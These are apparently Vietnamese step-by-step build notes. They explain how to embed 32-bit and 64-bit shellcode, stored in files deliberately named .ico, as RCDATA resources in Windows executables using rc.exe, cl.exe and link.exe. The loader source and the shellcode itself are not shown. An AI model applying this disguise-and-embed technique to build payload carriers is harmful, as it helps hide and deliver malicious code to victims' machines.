Các tệp hiện có:

embed_rsrc.cpp - Mã nguồn cho phiên bản 32-bit
embed_rsrcx64.cpp - Mã nguồn cho phiên bản 64-bit
shellcodex32.ico - Tệp chứa shellcode 32-bit (mặc dù có đuôi .ico, đây là shellcode)
shellcodex64.ico - Tệp chứa shellcode 64-bit (mặc dù có đuôi .ico, đây là shellcode)

Quy trình đầy đủ:
Bước 1: Tạo tệp tài nguyên (RC files)
Tạo hai tệp tài nguyên riêng biệt:

Cho phiên bản x32 (tệp rsrcx32.rc):

Copy#define SC_ICON 1234
SC_ICON RCDATA "shellcodex32.ico"

Cho phiên bản x64 (tệp rsrcx64.rc):

Copy#define SC_ICON 1234
SC_ICON RCDATA "shellcodex64.ico"
Bước 2: Biên dịch tệp tài nguyên
Mở Developer Command Prompt for Visual Studio và thực hiện:
Copyrc.exe rsrcx32.rc
rc.exe rsrcx64.rc
Điều này sẽ tạo ra:

rsrcx32.res
rsrcx64.res

Bước 3: Biên dịch mã nguồn C++

Cho phiên bản x32:

Copycl.exe /c /EHsc embed_rsrc.cpp

Cho phiên bản x64:

Copycl.exe /c /EHsc embed_rsrcx64.cpp
Các lệnh này sẽ tạo ra:

embed_rsrc.obj
embed_rsrcx64.obj

Bước 4: Liên kết để tạo tệp thực thi

Cho phiên bản x32:

Copylink.exe embed_rsrc.obj rsrcx32.res /OUT:embed_rsrc_x32.exe

Cho phiên bản x64:

Copylink.exe embed_rsrcx64.obj rsrcx64.res /OUT:embed_rsrc_x64.exe /MACHINE:X64
Kết quả cuối cùng là hai tệp thực thi:

embed_rsrc_x32.exe - Chương trình 32-bit với shellcode 32-bit
embed_rsrc_x64.exe - Chương trình 64-bit với shellcode 64-bit